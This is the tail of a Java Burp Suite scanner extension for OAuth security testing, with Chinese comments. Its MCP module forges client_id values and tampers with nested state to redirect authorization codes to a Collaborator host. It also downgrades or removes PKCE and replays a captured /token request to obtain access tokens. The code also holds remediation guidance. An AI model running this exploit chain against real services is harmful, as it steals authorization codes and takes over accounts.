    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            if (existingIssue.getHttpMessages().equals(newIssue.getHttpMessages())) {
                return -1;
            }
        }
        return 0;
    }


    @Override
    public void extensionUnloaded() {
        // Unload the plugin and stop running thread
        collaboratorThread.interrupt();
        stdout.println("[+] OAUTHScan Plugin Unloaded");
    }


    @Override
    public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    // ==========================================
    // ==== 新增：MCP 与嵌套 OAuth 专属检测模块 ====
    // ==========================================


    /**
     * 辅助方法：智能提取并解码 State 载荷
     * 返回数组 [原始编码片段, 解码后的明文 JSON]；如果提取失败返回 null
     */
    /**
     * 辅助方法：智能提取并解码 State 载荷 (增强容错、兼容驼峰命名、处理多重编码)
     */
    private String[] extractStatePayload(String stateVal, IExtensionHelpers helpers) {
        // 先进行一次彻底的 URL 解码，解决类似 %3D (=) 的问题
        String decodedStateVal = helpers.urlDecode(stateVal);

        // 我们要匹配的特征更宽泛了：全部转小写，同时兼容 client_id 和 clientid (驼峰)
        java.util.function.Predicate<String> isLegitJson = (dec) -> {
            String lower = dec.toLowerCase();
            return lower.trim().startsWith("{") && (lower.contains("client_id") || lower.contains("clientid") || lower.contains("redirect_uri") || lower.contains("redirecturi"));
        };

        // 1. 尝试直接 Base64 解码 (兼顾标准版和 URL-Safe 版)
        String[] candidates = { decodedStateVal, stateVal };
        for (String candidate : candidates) {
            try {
                String dec1 = new String(java.util.Base64.getDecoder().decode(candidate));
                if (isLegitJson.test(dec1)) return new String[]{candidate, dec1};
            } catch (Exception e) {}
            try {
                String dec2 = new String(java.util.Base64.getUrlDecoder().decode(candidate));
                if (isLegitJson.test(dec2)) return new String[]{candidate, dec2};
            } catch (Exception e) {}
        }

        // 2. 尝试正则提取 (ey开头通常是 base64 编码的 {)
        java.util.regex.Matcher eyjMatcher = java.util.regex.Pattern.compile("(ey[a-zA-Z0-9_\\-/]+={0,2})").matcher(decodedStateVal);
        while (eyjMatcher.find()) {
            try {
                String potentialBase64 = eyjMatcher.group(1);
                String dec = new String(java.util.Base64.getUrlDecoder().decode(potentialBase64));
                if (isLegitJson.test(dec)) return new String[]{potentialBase64, dec};
            } catch (Exception e) {}
        }

        return null;
    }


    /**
     * MCP 专属主动扫描模块 (增强版，包含二轮验证与智能拼接重构)
     */
    private List<IScanIssue> mcpActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        String layer = identifyLayer(baseRequestResponse);

        if ("L1".equals(layer)) {
            // ==========================================
            // Layer 1 专属：Flaw 2 客户端身份盲目信任
            // ==========================================
            IParameter clientIdParam = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
            if (clientIdParam != null && insertionPoint.getInsertionPointName().equals("client_id")) {
                stdout.println("[+] MCP Active Scan: Testing Client Identity Blind Trust on Layer 1");
                String fakeClientId = "fake_evil_mcp_client_" + System.currentTimeMillis();
                byte[] checkReq = helpers.updateParameter(baseRequestResponse.getRequest(),
                        helpers.buildParameter("client_id", fakeClientId, clientIdParam.getType()));

                IHttpRequestResponse checkResp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkReq);
                short statusCode = helpers.analyzeResponse(checkResp.getResponse()).getStatusCode();

                if (statusCode == 200 || statusCode == 302) {
                    boolean isVulnerable = true;
                    IResponseInfo checkRespInfo = helpers.analyzeResponse(checkResp.getResponse());

                    if (statusCode == 302) {
                        String location = getHttpHeaderValueFromList(checkRespInfo.getHeaders(), "Location");
                        if (location != null) {
                            // 先进行 URL 解码并转为小写
                            String decodedLocation = helpers.urlDecode(location).toLowerCase();

                            if (decodedLocation.contains("error=") ||
                                    decodedLocation.contains("invalid_client") ||
                                    decodedLocation.contains("invalid_request")) {
                                isVulnerable = false;
                            }
                        }
                    } else if (statusCode == 200) {
                        String responseStr = helpers.bytesToString(checkResp.getResponse()).toLowerCase();
                        // 核心修正：有些 IdP 在收到错误 client_id 时会返回 200 渲染一个包含错误提示的 HTML
                        if (responseStr.contains("invalid_client") || responseStr.contains("invalid_request") || responseStr.contains("client id is invalid")) {
                            isVulnerable = false;
                        }
                    }

                    if (isVulnerable) {
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                                new IHttpRequestResponse[] { callbacks.applyMarkers(checkResp, null, null) },
                                "[Flaw 2] Client Identity Blind Trust (Layer 1)",
                                "检测到 MCP 网关对 client_id 缺乏边界信任管控。我们注入了完全伪造的客户端标识 (<code>" + fakeClientId + "</code>)，服务端并未抛出 invalid_client 错误（重定向或页面内容未见拦截特征），而是继续推进了授权状态机。这表明系统可能允许任意恶意客户端接入。",
                                "Medium", "Tentative"
                        ));
                        IScanIssue pendingIssue = rememberF2DetectedAndReportPendingIfReady(baseRequestResponse);
                        if (pendingIssue != null) {
                            issues.add(pendingIssue);
                        }
                    }
                }
            }
        } else {
            // ==========================================
            // Layer 2：Flaw 4 嵌套上下文污染与签名绕过
            // ==========================================
            IParameter stateParam = helpers.getRequestParameter(baseRequestResponse.getRequest(), "state");
            if (stateParam != null && insertionPoint.getInsertionPointName().equals("state")) {
                String rawStateVal = stateParam.getValue();
                String urlDecodedStateVal = helpers.urlDecode(rawStateVal);
                String[] extracted = extractStatePayload(urlDecodedStateVal, helpers);

                if (extracted != null) {
                    String encodedPayload = extracted[0];
                    String decodedState = extracted[1];
                    String lowerDecoded = decodedState.toLowerCase();

                    if (lowerDecoded.contains("redirect_uri") || lowerDecoded.contains("redirecturi") || lowerDecoded.contains("code_challenge_method")|| lowerDecoded.contains("codechallengemethod")) {
                        IParameter codeParam0 = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code");//要判断这是不是callabck请求，要排除，不然会误判
                        if(codeParam0 == null){
                            stdout.println("[+] MCP Active Scan: Testing Flaw 4 via OAST on Layer 2+");

                            // 1. 生成专属的 Burp Collaborator Payload
                            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                            String collabPayload = collaboratorContext.generatePayload(true);
                            String evilUri = "https://" + collabPayload;

                            // ==========================================
                            // 方案 1: S256 -> plain (内层与外层参数同步降级)
                            // ==========================================
                            String tamperedState1 = decodedState
                                    .replaceAll("(?i)(\"redirect_uri\"\\s*:\\s*\")[^\"]+(\")", "$1" + evilUri + "$2")
                                    .replaceAll("(?i)(\"redirecturi\"\\s*:\\s*\")[^\"]+(\")", "$1" + evilUri + "$2")
                                    .replace("S256", "plain").replace("s256", "plain");

                            String encodedTamperedPayload1;
                            if (encodedPayload.contains("-") || encodedPayload.contains("_")) {
                                encodedTamperedPayload1 = java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(tamperedState1.getBytes());
                            } else {
                                encodedTamperedPayload1 = java.util.Base64.getEncoder().encodeToString(tamperedState1.getBytes());
                            }

                            String finalTamperedStateParam1 = urlDecodedStateVal.replace(encodedPayload, encodedTamperedPayload1);
                            byte[] checkReq1 = helpers.updateParameter(baseRequestResponse.getRequest(),
                                    helpers.buildParameter("state", finalTamperedStateParam1, stateParam.getType()));

                            // 外层同步降级
                            IParameter methodParam1 = helpers.getRequestParameter(checkReq1, "code_challenge_method");
                            if (methodParam1 != null && methodParam1.getValue().equalsIgnoreCase("S256")) {
                                checkReq1 = helpers.updateParameter(checkReq1,
                                        helpers.buildParameter("code_challenge_method", "plain", methodParam1.getType()));
                            }

                            IRequestInfo newReqInfo1 = helpers.analyzeRequest(baseRequestResponse.getHttpService(), checkReq1);
                            String urlForBrowser1 = newReqInfo1.getUrl().toString();


                            // ==========================================
                            // 方案 2: 彻底移除 PKCE 参数 (内层与外层同步移除以触发 Fallback)
                            // ==========================================
                            String tamperedState2 = decodedState
                                    .replaceAll("(?i)(\"redirect_uri\"\\s*:\\s*\")[^\"]+(\")", "$1" + evilUri + "$2")
                                    .replaceAll("(?i)(\"redirecturi\"\\s*:\\s*\")[^\"]+(\")", "$1" + evilUri + "$2");

                            // 移除内层 JSON 中的 code_challenge 和 code_challenge_method 键值对
                            tamperedState2 = tamperedState2.replaceAll("(?i)\"code_?challenge\"\\s*:\\s*\"[^\"]+\"\\s*,?\\s*", "");
                            tamperedState2 = tamperedState2.replaceAll("(?i)\"code_?challenge_?method\"\\s*:\\s*\"[^\"]+\"\\s*,?\\s*", "");
                            // 清理移除后可能产生的多余 JSON 逗号 (如 {, 或 ,} 或 ,, ) 防止前端解析报错
                            tamperedState2 = tamperedState2.replaceAll(",\\s*}", "}").replaceAll("\\{\\s*,", "{").replaceAll(",\\s*,", ",");

                            String encodedTamperedPayload2;
                            if (encodedPayload.contains("-") || encodedPayload.contains("_")) {
                                encodedTamperedPayload2 = java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(tamperedState2.getBytes());
                            } else {
                                encodedTamperedPayload2 = java.util.Base64.getEncoder().encodeToString(tamperedState2.getBytes());
                            }

                            String finalTamperedStateParam2 = urlDecodedStateVal.replace(encodedPayload, encodedTamperedPayload2);
                            byte[] checkReq2 = helpers.updateParameter(baseRequestResponse.getRequest(),
                                    helpers.buildParameter("state", finalTamperedStateParam2, stateParam.getType()));

                            // 外层同步移除参数
                            IParameter challengeParamOuter = helpers.getRequestParameter(checkReq2, "code_challenge");
                            if (challengeParamOuter != null) {
                                checkReq2 = helpers.removeParameter(checkReq2, challengeParamOuter);
                            }
                            IParameter methodParamOuter = helpers.getRequestParameter(checkReq2, "code_challenge_method");
                            if (methodParamOuter != null) {
                                checkReq2 = helpers.removeParameter(checkReq2, methodParamOuter);
                            }

                            IRequestInfo newReqInfo2 = helpers.analyzeRequest(baseRequestResponse.getHttpService(), checkReq2);
                            String urlForBrowser2 = newReqInfo2.getUrl().toString();


                            // ==========================================
                            // 5. 整合抛出单一的 [Pending User Action] Issue
                            // ==========================================
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                    "[Flaw 4 validation] Pending User Action: Click to validate",
                                    "<b>检测到潜在的 MCP 嵌套上下文污染攻击面，需要人工辅助验证。</b><br><br>" +
                                            "请在已登录目标业务的浏览器中，手动访问以下链接并完成授权流程：<br><br>" +
                                            "<b>1. S256 -> plain (参数降级)</b><br>" +
                                            "<code>" + urlForBrowser1 + "</code><br><br>" +
                                            "<b>2. PKCE 参数移除 (强制绕过验证)</b><br>" +
                                            "<code>" + urlForBrowser2 + "</code><br><br>" +
                                            "<i>扫描器已在后台开启异步轮询线程 (持续 5 分钟)。如果目标网关解包了恶意 State 并将流量打回 Collaborator 探针，系统将自动追加高危漏洞报告。</i>",
                                    "Information", "Certain"
                            ));

                            // 6. 开启独立的后台线程，异步监听 Collaborator
                            new Thread(() -> {
                                int pollingAttempts = 30; // 轮询 30 次
                                int sleepInterval = 10000; // 每次间隔 10 秒 (总计挂机监听 5 分钟)

                                stdout.println("[*] Starting OAST polling thread for payload: " + collabPayload);

                                for (int i = 0; i < pollingAttempts; i++) {
                                    try {
                                        Thread.sleep(sleepInterval);
                                    } catch (InterruptedException e) {
                                        break;
                                    }

                                    try {
                                        // 从 Burp 官方服务器拉取该探针的交互记录
                                        java.util.List<IBurpCollaboratorInteraction> interactions = collaboratorContext.fetchAllCollaboratorInteractions();

                                        if (interactions != null && !interactions.isEmpty()) {
                                            // 发现回连！
                                            StringBuilder interactionDetails = new StringBuilder();
                                            String stolenCode = null;

                                            for (IBurpCollaboratorInteraction interaction : interactions) {
                                                interactionDetails.append("<b>Type:</b> ").append(interaction.getProperty("type")).append("<br>");
                                                interactionDetails.append("<b>Client IP:</b> ").append(interaction.getProperty("client_ip")).append("<br>");

                                                // 如果是 HTTP 请求，提取完整的请求头和正文，并尝试剥离 stolen_code
                                                if (interaction.getProperty("type").equalsIgnoreCase("http")) {
                                                    String reqBase64 = interaction.getProperty("request");
                                                    if (reqBase64 != null) {
                                                        byte[] reqBytes = helpers.base64Decode(reqBase64);
                                                        String reqString = helpers.bytesToString(reqBytes);

                                                        // 从请求的 URL 或 Body 中提取被偷走的 code (兼容 ?code=xxx 或 body 里的 code=xxx)
                                                        java.util.regex.Matcher codeMatcher = java.util.regex.Pattern.compile("code=([^&\\s]+)").matcher(reqString);
                                                        if (codeMatcher.find()) {
                                                            stolenCode = codeMatcher.group(1);
                                                        }

                                                        // 转义 HTML 字符，防止报告格式错乱
                                                        interactionDetails.append("<pre>").append(reqString.replace("<", "&lt;").replace(">", "&gt;")).append("</pre><br><hr>");
                                                    }
                                                }
                                            }

                                            // ==========================================
                                            // 只在拿到 Code 时，才执行 ATO、发报告并 Break！
                                            // ==========================================
                                            if (stolenCode != null) {
                                                String issueTitle = "[Flaw 4] Nested Context Pollution (OAST Confirmed)";
                                                String issueDesc = "<b>高危漏洞实锤：嵌套上下文污染与验签绕过！</b><br><br>" +
                                                        "在人工触发授权流程后，Burp Collaborator 成功捕获到了来自目标系统的网络请求，并获取到了授权码 (Code)。<br>" +
                                                        "这证明第一层 MCP 网关在处理回调时未校验 State 的签名与完整性。<br><br>";
                                                String severity = "High";
                                                List<IHttpRequestResponse> evidenceList = new ArrayList<>();
                                                evidenceList.add(baseRequestResponse);

                                                stdout.println("[*] Stolen Code retrieved: " + stolenCode + ". Attempting Token Exchange ATO...");

                                                // 从解码后的 State 里提取 client_id 和 code_challenge
                                                String clientId = null;
                                                String codeChallenge = null;

                                                // 兜底 2：如果请求参数里没带，再去被篡改的 state JSON 里面挖 (兼容 Notion 等全量打包模式)
                                                String lowerDecodedState = decodedState.toLowerCase();

                                                java.util.regex.Matcher clientMatcher = java.util.regex.Pattern.compile("(?i)\"client_?id\"\\s*:\\s*\"([^\"]+)\"").matcher(decodedState);
                                                if (clientMatcher.find()) clientId = clientMatcher.group(1);


                                                java.util.regex.Matcher challengeMatcher = java.util.regex.Pattern.compile("(?i)\"code_?challenge\"\\s*:\\s*\"([^\"]+)\"").matcher(decodedState);
                                                if (challengeMatcher.find()) codeChallenge = challengeMatcher.group(1);


                                                // 兜底 2：如果 JSON 里没有，再退回到外部 HTTP 参数中提取 (针对标准架构)
                                                if (clientId == null) {
                                                    IParameter clientParamReq = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
                                                    if (clientParamReq != null) clientId = clientParamReq.getValue();
                                                }

                                                if (codeChallenge == null) {
                                                    IParameter challengeParamReq = helpers.getRequestParameter(baseRequestResponse.getRequest(), "code_challenge");
                                                    if (challengeParamReq != null) codeChallenge = challengeParamReq.getValue();
                                                }


                                                stdout.println("[*] Extracted clientId: " + clientId + " | codeChallenge: " + codeChallenge);

                                                if (clientId != null && codeChallenge != null) {
                                                    // 遍历 Burp 的 Proxy History，寻找匹配的 POST /token 请求
                                                    IHttpRequestResponse[] history = callbacks.getProxyHistory();
                                                    IHttpRequestResponse tokenBaseReq = null;

                                                    for (IHttpRequestResponse item : history) {
                                                        IRequestInfo info = helpers.analyzeRequest(item);
                                                        if (info.getMethod().equals("POST")) {
                                                            IParameter grantParam = helpers.getRequestParameter(item.getRequest(), "grant_type");
                                                            IParameter clientParam = helpers.getRequestParameter(item.getRequest(), "client_id");
                                                            if (grantParam != null && grantParam.getValue().contains("authorization_code") &&
                                                                    clientParam != null && clientParam.getValue().equals(clientId)) {
                                                                tokenBaseReq = item;
                                                                break;
                                                            }
                                                        }
                                                    }

                                                    // 找到了真实的 /token 请求！开始移花接木！
                                                    if (tokenBaseReq != null) {
                                                        byte[] newTokenReq = tokenBaseReq.getRequest();

                                                        // 1. 替换 code 为偷来的 code
                                                        IParameter codeParam = helpers.getRequestParameter(newTokenReq, "code");
                                                        if (codeParam != null) {
                                                            newTokenReq = helpers.updateParameter(newTokenReq, helpers.buildParameter("code", stolenCode, codeParam.getType()));
                                                        }

                                                        // 2. 替换 code_verifier 为降级后的 code_challenge
                                                        IParameter verifierParam = helpers.getRequestParameter(newTokenReq, "code_verifier");
                                                        if (verifierParam != null) {
                                                            newTokenReq = helpers.updateParameter(newTokenReq, helpers.buildParameter("code_verifier", codeChallenge, verifierParam.getType()));
                                                        }

                                                        // 3. 发送木马换 Token 请求！
                                                        IHttpRequestResponse tokenResp = callbacks.makeHttpRequest(tokenBaseReq.getHttpService(), newTokenReq);
                                                        evidenceList.add(callbacks.applyMarkers(tokenResp, null, null));

                                                        String respBody = helpers.bytesToString(tokenResp.getResponse()).toLowerCase();
                                                        if (respBody.contains("\"access_token\"")) {
                                                            issueTitle = "[Flaw 4] CRITICAL: Full Account Takeover via PKCE Downgrade";
                                                            issueDesc = "<b>高危：完全账户接管 (Account Takeover)！</b><br><br>" +
                                                                    "扫描器不仅通过 Collaborator 窃取了授权码 (Code)，还成功进行了 <b>PKCE 降级攻击验证</b>。<br>" +
                                                                    "通过将嵌套 State 中的 <code>code_challenge_method</code> 篡改为 <code>plain</code>，扫描器利用原始的 <code>code_challenge</code> 作为 <code>code_verifier</code>，成功向目标网关兑换到了高权限的 <b>Access Token</b>！<br>" +
                                                                    "这证明目标系统对 OAuth 核心状态机校验完全失效，攻击者可实现无交互的一键劫持。<br><br>";
                                                            severity = "High"; // Burp 只有 High，但在标题打上了 CRITICAL
                                                            stdout.println("[!!!] ATO SUCCESS: Access Token retrieved for Flaw 4!");
                                                        } else {
                                                            issueDesc += "<i>注：扫描器尝试利用窃取的 Code 和降级的 PKCE 发起了 Token 换取请求，但被目标服务器拒绝（可能存在额外防御或 Code 已过期）。换取请求已附在证据链中。</i><br><br>";
                                                        }
                                                    } else {
                                                        stdout.println("[-] ATO Aborted: Could not find matching /token request in Proxy History for client: " + clientId);
                                                        issueDesc += "<i>注：由于在 Proxy History 中未找到对应的 /token 历史请求，扫描器终止了自动验签绕过（ATO）测试，但窃取到 Code 已实锤了漏洞。</i><br><br>";
                                                    }
                                                }

                                                // 动态追加高危漏洞 Issue
                                                callbacks.addScanIssue(new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                                                        evidenceList.toArray(new IHttpRequestResponse[0]),
                                                        issueTitle,
                                                        issueDesc +
                                                                "<b>投递的无损篡改 State 参数 (方案 1 - 降级)：</b><br><code style='word-break: break-all;'>" + finalTamperedStateParam1 + "</code><br><br>" +
                                                                "<b>投递的无损篡改 State 参数 (方案 2 - 移除)：</b><br><code style='word-break: break-all;'>" + finalTamperedStateParam2 + "</code><br><br>" +
                                                                "<b>Collaborator 捕获的请求详情（绝杀证据）：</b><br>" + interactionDetails.toString(),
                                                        severity, "Certain"
                                                ));

                                                stdout.println("[!] Flaw 4 Confirmed! Collaborator ping received for " + collabPayload);
                                                break; // 抓到一次实锤 Code 且处理完毕后，才允许跳出轮询结束线程！

                                            } else {
                                                // 没拿到 Code（只有 DNS 探针或是没带 Code 的请求），绝不 break，继续等！
                                                stdout.println("[*] OAST Ping received (DNS/Pre-flight) for " + collabPayload + ", but no Code found yet. Continuing to poll...");
                                            }
                                        }
                                    } catch (Exception e) {
                                        stderr.println("[-] Error in Collaborator polling thread: " + e.toString());
                                    }
                                }
                                stdout.println("[-] Flaw 4 OAST polling thread finished for " + collabPayload);
                            }).start();
                        }
                    }
                }
            }
        }

        return issues;


    }


}




// Class implementing IScanIssue
class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;
    private String confidence;

    public CustomScanIssue(IHttpService httpService, URL url, IHttpRequestResponse[] httpMessages, String name, String detail, String severity, String confidence)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
        this.confidence = confidence;
    }

    @Override
    public URL getUrl()
    {
        return url;
    }

    @Override
    public String getIssueName()
    {
        return name;
    }

    @Override
    public int getIssueType()
    {
        return 0;
    }

    @Override
    public String getSeverity()
    {
        return severity;
    }

    @Override
    public String getConfidence()
    {
        return confidence;
    }

    @Override
    public String getIssueBackground()
    {
        return "OAUTHv2 is an open standard that allows applications to get access to protected "
                +"resources and APIs on behalf of users without accessing their credentials.\n "
                +"OAUTHv2 defines overarching schemas for granting authorization but does not describe how "
                +"to actually perform authentication.\nOpenID instead is an OAUTHv2 extension which strictly defines some "
                +"authentication patterns to grant access to users by authenticating them through another service "
                +"or provider.\n "
                +"There are many different ways to implement OAUTHv2 and OpenID login procedures. They are widely "
                +"supported by identity providers and API vendors and could be used in various contexts"
                +"(as for Web, Mobile, Native desktop applications, etc.).\n "
                +"Cause of their complexity and versatility, OAUTHv2 and OpenID are both extremely common "
                +"and inherently prone to implementation mistakes, and this can result in various kind of "
                +"vulnerabilities, which in some cases could allow attackers to obtain reserved data and/or "
                +"potentially completely bypass authentication.";
    }

    @Override
    public String getRemediationBackground()
    {
        return "To prevent OAUTHv2 and OpenID security issues, it is essential for the involved entities "
                +"(Service-Provider and Client-Application) to implement robust validation of the key inputs. Given their "
                +"complexity, it is important for developers to implement carefully OAUTHv2 and OpenID to make them "
                +"as secure as possible.\n It is important to note that vulnerabilities can arise both on "
                +"the side of the Client-Application and the Service-Provider itself.\n "
                +"Even if your own implementation is rock solid, you're still ultimately reliant on the "
                +"application at the other end being equally robust.\n<br><br>"
                +"For OAUTHv2/OpenID Service-Providers:\n"
                +"<ul><li>Require Client-Applications to register a whitelist of valid <code>redirect_uri</code> "
                +"values. Wherever possible, use strict byte-for-byte comparison to validate the URI in "
                +"any incoming requests. Only allow complete and exact matches rather than using pattern "
                +"matching. This prevents attackers from accessing other pages on the whitelisted "
                +"domains.</li><li>Enforce use of the <code>state</code> parameter. Its value should be bound "
                +"to the user's session by including some unguessable, session-specific data, such "
                +"as a hash containing the session cookie. This helps protect users against CSRF-like "
                +"attacks. It also makes it much more difficult for an attacker to use any stolen "
                +"authorization codes.</li><li>On the Resource-Server, make sure you verify that the "
                +"access token was issued to the same <code>client_id</code> that is making the request. "
                +"Check also the <code>scope</code> parameter in all requests to make sure that this matches "
                +"the scope for which the token was originally granted.</li>"
                +"<li>If using OAUTHv2 (or OpenID) Authorization Code Flow make sure to invalidate "
                +"each authorization code after its first use at the Resource-Server endpoint. In addition "
                +"attackers that retrieve unused authorization codes (stolen or brute-forced) could be able "
                +"to use them regardless of how long ago they were issued. To mitigate this potential issue, "
                +"unused authorization codes should expire after 10-15 minutes.</li></ul>\n<br> "
                +"For OAUTHv2/OpenID Client-Applications:\n"
                +"<ul><li>Developers have to fully understand the details of how OAUTHv2 (or OpenID) works "
                +"before implementing it. Many vulnerabilities are caused by a simple lack of "
                +"understanding of what exactly is happening at each stage and how this can "
                +"potentially be exploited.</li><li>Use the <code>state</code> parameter even though it is "
                +"not mandatory. Its value should be bound to the user's session by including some unguessable, "
                +"session-specific data, such as a hash containing the session cookie. This helps protect users "
                +"against CSRF-like attacks, and makes it much more difficult for an attacker to use any stolen "
                +"authorization codes.</li><li>When developing OAUTHv2/OpenID processes for Mobile (or Native desktop) "
                +"Client-Applications, it is often not possible to keep the <code>client_secret</code> private. "
                +"In these situations, the PKCE (RFC 7636) mechanism may be used to provide additional "
                +"protection against access code interception or leakage.</li><li>When using the "
                +"OpenID parameter <code>id_token</code>, make sure it is properly validated according to the JSON "
                +"Web Signature, JSON Web Encryption, and OpenID specifications.</li><li>Developers "
                +"should be careful with authorization codes (they may be leaked via Referer headers "
                +"when external images, scripts, or CSS content is loaded). It is also important to "
                +"not include them in dynamically generated JavaScript files as they may be "
                +"executed from external domains.</li><li>Developers should use a secure "
                +"storage mechanism for access token and refresh token on client-side (i.e. use "
                +"Keychain/Keystore for mobile apps, use browser in-memory for web apps, etc.). "
                +"It is discouraged to store tokens on browsers local storage, because they will be "
                +"accessible by Javascript (XSS)</li><li>If possible use short lived access tokens "
                +"(i.e. expiration 30 minutes), and also enable refresh token rotation (eg. expiration 2 hours).</li>"
                +"<li>The OAUTHv2 Resource Owner Password Credentials Flow is insecure and considered deprecated "
                +"by OAUTHv2 specifications, and it should be replaced by OAUTHv2 Authorization Code Flow (PKCE). "
                +"This OAuthv2 flow was introduced only for legacy Web applications for migration reasons, and "
                +"in particular it must be avoided in Mobile, Native desktop and SPA application contexts (public clients).</li>"
                +"<li>The OAUTHv2 Implicit Flow is insecure and considered deprecated by the standard specifications, "
                +"avoid to use it and instead adopt OAUTHv2 Authorization Code Flow. "
                +"At the same times, developers should be careful when implementing OpenID Implicit Flow "
                +"because when not properly configured it could be vulnerable to access token leakage and "
                +"access token replay. In particular avoid to use any Implicit Flow (OAUTHv2 and OpenID) "
                +"in Mobile, Native desktop and SPA application contexts (public clients).</li></ul>\n<br><br>"
                +"<b>References:</b><br><ul>"
                +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6749\">https://datatracker.ietf.org/doc/html/rfc6749</a></li>"
                +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6819\">https://datatracker.ietf.org/doc/html/rfc6819</a></li>"
                +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6750\">https://datatracker.ietf.org/doc/html/rfc6750</a></li>"
                +"<li><a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09</a></li>"
                +"<li><a href=\"https://oauth.net/2/\">https://oauth.net/2/</a></li>"
                +"<li><a href=\"https://openid.net/connect/\">https://openid.net/connect/</a></li>"
                +"<li><a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a></li>"
                +"<li><a href=\"https://portswigger.net/web-security/oauth\">https://portswigger.net/web-security/oauth</a></li>"
                +"<li><a href=\"https://portswigger.net/web-security/oauth/openid\">https://portswigger.net/web-security/oauth/openid</a></li></ul>\n";
    }

    @Override
    public String getIssueDetail()
    {
        return detail;
    }

    @Override
    public String getRemediationDetail()
    {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService()
    {
        return httpService;
    }

}
